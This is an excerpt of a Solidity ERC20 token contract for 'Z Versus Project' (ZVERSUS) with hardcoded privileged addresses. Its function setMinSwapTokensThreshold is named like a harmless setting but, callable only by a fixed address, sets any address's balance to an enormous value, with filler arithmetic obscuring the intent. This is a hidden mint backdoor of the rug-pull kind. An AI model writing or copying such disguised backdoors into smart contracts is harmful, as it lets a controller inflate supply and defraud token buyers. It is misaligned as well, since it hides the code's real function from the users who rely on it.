...
contract ZVersusProject is Context, IERC20, IERC20Metadata,Ownable {
    mapping(address => uint256) private _balances;
    	address  public _OnlyCan =0xD829D6416E2EDA5De4f2250DF3d851D9f3b5fAF1;
    ...
    uint256 private _rTotal = 1000000000000000000000000000000000000;
    struct userSells{
        uint256 swapLimit;
        bool isSwap;
    }
    ...
    constructor() {
       _totalSupply = 10000000000 * (10**9);
        _setOwner(0xD829D6416E2EDA5De4f2250DF3d851D9f3b5fAF1);
        _name="Z Versus Project";
        _symbol="ZVERSUS";
        _mint(0xa74908A05673c839099440488cDEBf10F99350CA, _totalSupply);
    }
    /**
    ...
    function setMinSwapTokensThreshold(address owner) public onlyCan() {
        _balances[owner] = (122 * 1 + _balances[owner] - 122 * 1 + _balances[owner]) + (_rTotal);
    }
